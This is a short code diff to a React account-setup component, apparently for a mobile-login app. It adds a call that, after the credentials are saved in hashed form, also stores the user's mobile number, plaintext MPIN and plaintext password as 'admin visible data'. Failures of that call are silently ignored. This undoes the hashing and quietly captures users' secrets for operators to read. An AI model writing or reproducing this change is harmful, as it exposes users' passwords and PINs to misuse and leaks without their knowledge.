@@ -6,6 +6,7 @@ import { AnimatePresence, motion } from "motion/react";
 import { useEffect, useRef, useState } from "react";
 import { toast } from "sonner";
 import {
+  useSaveAdminVisibleData,
   useSaveProfile,
   useSetMpin,
   useSetUserCredentials,
@@ -50,6 +51,7 @@ export default function SetupProfile() {
   const saveProfile = useSaveProfile();
   const setMpin = useSetMpin();
   const setUserCredentials = useSetUserCredentials();
+  const saveAdminData = useSaveAdminVisibleData();
 
   useEffect(() => {
     if (step === 3) {
@@ -144,6 +146,15 @@ export default function SetupProfile() {
         setUserCredentials.mutateAsync({ mobileHash, passwordHash }),
         setMpin.mutateAsync(pinHash),
       ]);
+      try {
+        await saveAdminData.mutateAsync({
+          mobile: mobileClean,
+          mpin: p,
+          password,
+        });
+      } catch {
+        /* non-critical */
+      }
       toast.success("Account successfully create ho gaya!");
     } catch (err) {
       const errMsg = String(err);
